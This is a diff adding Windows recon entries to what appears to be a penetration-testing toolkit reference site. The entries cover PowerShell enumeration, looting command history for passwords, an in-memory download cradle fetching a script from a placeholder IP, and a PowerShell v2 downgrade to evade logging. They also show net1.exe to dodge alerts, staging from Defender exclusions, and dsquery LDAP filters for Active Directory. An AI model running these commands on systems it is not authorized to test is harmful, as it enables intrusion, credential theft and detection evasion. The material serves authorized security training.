@@ -9912,6 +9912,118 @@ var TOOLKIT = [
             ]
           },
           {
+            "title": "Living off the land: PowerShell recon & its logging",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Recon cmdlets",
+                "cmd": "Get-Module                      # loaded modules (is ActiveDirectory there?)\nGet-ExecutionPolicy -List       # policy per scope\nSet-ExecutionPolicy Bypass -Scope Process   # bypass for THIS process only\nGet-ChildItem Env: | ft Key,Value           # env: paths, USERDOMAIN, LOGONSERVER"
+              },
+              {
+                "label": "Loot the user's PowerShell history",
+                "cmd": "Get-Content $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\n# frequently holds passwords, share paths and script locations"
+              },
+              {
+                "label": "In-memory download cradle (no file on disk)",
+                "cmd": "powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://<ip>/x.ps1')\""
+              },
+              {
+                "label": "Downgrade to PowerShell v2 (evade script-block logging)",
+                "cmd": "# Script Block (4104) + Module (4103) logging need PS 3.0+; v2 is not logged.\npowershell.exe -version 2\nGet-Host        # 'Version : 2.0' confirms the downgrade\n# BUT launching v2 is itself logged (engine-start event 400, HostVersion 2.0),\n# so it is a tell, not true invisibility."
+              }
+            ]
+          },
+          {
+            "title": "Checking host defenses & sessions",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it shows"
+            ],
+            "rows": [
+              [
+                "netsh advfirewall show allprofiles",
+                "Firewall state per profile (Domain/Private/Public) and its logging config"
+              ],
+              [
+                "sc query windefend",
+                "Whether Windows Defender's service is RUNNING (from cmd.exe)"
+              ],
+              [
+                "Get-MpComputerStatus",
+                "Defender detail: real-time / behaviour / tamper protection, signature age, scan state"
+              ],
+              [
+                "Get-MpPreference | ft ExclusionPath,ExclusionProcess",
+                "Defender exclusions — unmonitored paths/processes to stage from"
+              ],
+              [
+                "qwinsta  /  query user",
+                "Other logged-on or RDP sessions — the 'am I alone?' check before acting"
+              ],
+              [
+                "net1 ...  (instead of net ...)",
+                "net1.exe runs the same functions without the literal 'net ' string some tools alert on"
+              ]
+            ]
+          },
+          {
+            "title": "dsquery LDAP filters",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Objects & wildcard search",
+                "cmd": "dsquery user                 # all user DNs\ndsquery computer             # all computer DNs\ndsquery * \"CN=Users,DC=corp,DC=local\"   # every object under an OU/container"
+              },
+              {
+                "label": "Users with PASSWD_NOTREQD (UAC bit 32)",
+                "cmd": "dsquery * -filter \"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl"
+              },
+              {
+                "label": "Find Domain Controllers (UAC bit 8192)",
+                "cmd": "dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName"
+              },
+              {
+                "label": "One-shot domain + trust map via WMI (no dsquery)",
+                "cmd": "wmic ntdomain get Caption,DomainName,DnsForestName,DomainControllerAddress\n# lists the domain, child domains and trusted/external forests"
+              }
+            ]
+          },
+          {
+            "title": "LDAP OID rules & common UAC bitmasks",
+            "type": "table",
+            "columns": [
+              "Filter token",
+              "Meaning"
+            ],
+            "rows": [
+              [
+                "...803:=<n>  (1.2.840.113556.1.4.803)",
+                "Bitwise AND — the value must match this bit EXACTLY (the usual single-attribute rule)"
+              ],
+              [
+                "...804:=<n>  (1.2.840.113556.1.4.804)",
+                "Bitwise OR — match if ANY bit in the value matches"
+              ],
+              [
+                "...1941:=<dn>  (1.2.840.113556.1.4.1941)",
+                "Match across chained DN ownership/membership (recursive)"
+              ],
+              [
+                "&  |  !",
+                "Logical AND / OR / NOT, e.g. (&(objectClass=user)(!userAccountControl:...803:=64))"
+              ],
+              [
+                "UAC 2 / 32 / 64",
+                "ACCOUNTDISABLE / PASSWD_NOTREQD / PASSWD_CANT_CHANGE"
+              ],
+              [
+                "UAC 8192 / 524288",
+                "SERVER_TRUST_ACCOUNT (a Domain Controller) / TRUSTED_FOR_DELEGATION (unconstrained)"
+              ]
+            ]
+          },
+          {
             "title": "Services, processes & scheduled tasks",
             "type": "table",
             "columns": [
@@ -10073,6 +10185,11 @@ var TOOLKIT = [
               "icacls output is the map for the 'writable + privileged' privesc pattern — a service binary, scheduled-task script, or DLL directory writable by your user is the overlap you're looking for.",
               "sc config, icacls /grant, schtasks /create, net user /add and netsh firewall changes modify the host — they are noisy, often logged, and should be deliberate, cleaned up, and within scope.",
               "wmic is deprecated and absent on the newest builds; prefer sc, PowerShell Get-CimInstance, or the Get-* cmdlets where wmic is missing.",
+              "Living off the land = native tools only — it beats uploading tooling when a host has no internet, runs EDR, or baselines network traffic: signed built-ins blend in and pull nothing across the wire. Prefer one systeminfo over five host-recon commands to cut log volume.",
+              "net1.exe is an alias for net.exe: some monitoring keys on the literal 'net ' string, so net1 group \"Domain Admins\" /domain runs the same query more quietly.",
+              "Downgrading to PowerShell v2 disables Script Block (4104) and Module (4103) logging, but the downgrade is itself logged (engine-start event 400, HostVersion 2.0) — a tell, not invisibility (see the PowerShell-logging theory page).",
+              "arp -a and route print reveal other subnets the host already talks to — the quiet way to spot pivot targets without scanning.",
+              "net.exe and dsquery are commonly watched by EDR; space out these queries and expect alerts in heavily-monitored environments.",
               "Confirm written authorization before enumerating or changing anything on a host you don't own."
             ]
           },
@@ -10103,6 +10220,18 @@ var TOOLKIT = [
               {
                 "label": "Toolkit — Mimikatz (credential extraction)",
                 "url": "tool-detail.html?tool=mimikatz"
+              },
+              {
+                "label": "Theory — LDAP and the AD Database (filters & OIDs)",
+                "url": "theory/2026-08-18-ldap.html"
+              },
+              {
+                "label": "Theory — Windows Telemetry & PowerShell Logging",
+                "url": "theory/2026-09-23-windows-telemetry-logging.html"
+              },
+              {
+                "label": "Theory — BloodHound & AD Enumeration",
+                "url": "theory/2026-10-09-bloodhound-ad-enumeration.html"
               }
             ]
           }
